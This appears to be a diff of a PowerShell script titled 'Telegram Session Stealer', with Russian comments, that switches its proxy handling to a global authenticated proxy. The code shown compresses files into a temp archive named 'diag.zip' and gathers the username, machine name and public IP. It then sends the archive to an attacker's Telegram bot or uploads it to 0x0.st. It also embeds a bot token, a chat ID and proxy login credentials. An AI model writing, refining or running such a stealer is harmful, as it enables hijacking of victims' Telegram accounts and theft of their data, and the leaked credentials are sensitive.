@@ -1,22 +1,23 @@
 # ============================================================
-# Telegram Session Stealer + 0x0.st + Proxy (400 fix final)
+# Telegram Session Stealer + 0x0.st + Global Proxy
 # ============================================================
 
 $botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"
 $chatId   = "8620709143"
 
-# Прокси
+# Настройка глобального прокси (действует для всех WebRequest)
 $proxy = New-Object System.Net.WebProxy("http://gate.proxydata.ru:3129", $true)
 $proxy.Credentials = New-Object System.Net.NetworkCredential("user-xpx93ax5", "5pxp942ldb7jtnh2")
+[System.Net.WebRequest]::DefaultWebProxy = $proxy
 
-# Функция отправки в Telegram (с UploadData)
+# Функция отправки в Telegram
 function Send-TelegramMessage {
     param($text)
     $url = "https://api.telegram.org/bot$botToken/sendMessage"
     $body = @{ chat_id = $chatId; text = $text } | ConvertTo-Json -Compress
 
     $wc = New-Object System.Net.WebClient
-    $wc.Proxy = $proxy
+    # WebClient использует глобальный прокси по умолчанию
     $wc.Encoding = [System.Text.Encoding]::UTF8
     $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")
 
@@ -29,7 +30,7 @@ function Send-TelegramMessage {
         $reader = New-Object System.IO.StreamReader($stream)
         $serverError = $reader.ReadToEnd()
         Write-Host "❌ Ошибка Telegram API: $serverError" -ForegroundColor Red
-        # Fallback через curl (на случай, если UploadData не сработает)
+        # fallback через curl
         $tempFile = [System.IO.Path]::GetTempFileName()
         $body | Out-File -FilePath $tempFile -Encoding UTF8
         $proxyUrl = "http://gate.proxydata.ru:3129"
@@ -46,11 +47,11 @@ function Send-TelegramMessage {
     }
 }
 
-# Функция загрузки на 0x0.st (с fallback)
+# Функция загрузки на 0x0.st
 function Upload-To0x0 {
     param($filePath)
     $wc = New-Object System.Net.WebClient
-    $wc.Proxy = $proxy
+    # Использует глобальный прокси
     try {
         $response = $wc.UploadFile("https://0x0.st", "POST", $filePath)
         return [System.Text.Encoding]::UTF8.GetString($response).Trim()
@@ -91,10 +92,10 @@ try {
     $zip = "$env:TEMP\diag.zip"
     Compress-Archive -Path $paths -DestinationPath $zip -Force
 
-    # 4. Сбор информации
+    # 4. Сбор информации (глобальный прокси уже установлен)
     $user = $env:USERNAME
     $comp = $env:COMPUTERNAME
-    $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -Proxy $proxy).Content.Trim()
+    $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content.Trim()
     $caption = "$user@$comp | IP: $ip"
     $size = (Get-Item $zip).Length
 
@@ -121,7 +122,6 @@ try {
         $url = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId&caption=$caption"
 
         $wc = New-Object System.Net.WebClient
-        $wc.Proxy = $proxy
         $wc.Encoding = [System.Text.Encoding]::UTF8
         foreach ($key in $headers.Keys) { $wc.Headers.Add($key, $headers[$key]) }
 
